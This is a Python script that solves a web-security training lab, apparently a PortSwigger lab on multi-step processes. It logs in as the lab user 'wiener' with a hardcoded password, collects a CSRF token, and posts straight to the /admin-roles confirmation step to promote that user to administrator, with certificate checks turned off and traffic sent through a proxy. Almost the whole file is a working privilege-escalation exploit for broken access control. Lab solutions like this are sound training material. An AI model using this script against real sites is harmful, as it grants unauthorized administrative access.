# Lab: Multi-step process with no access control on one step
import os
import requests
import urllib3
from bs4 import BeautifulSoup
import sys
from dotenv import load_dotenv

load_dotenv()

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(s, url):
    path = "/login"
    r = s.get(url + path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def login(s, url):
    path = "/login"
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    r = s.post(url + path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> logged in !")
    else:
        print("(-) Couldn't log into user acc")
        exit(-1)


def change_user_role(s, url):
    login(s, url)
    admin_roles_path = "/admin-roles"
    data = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
    r = s.post(url + admin_roles_path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> Successfully changed role from user to admin!!!")
    else:
        print("(-) Couldn't change role")
        exit(-1)



def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    change_user_role(s, url)


if __name__ == "__main__":
    main()
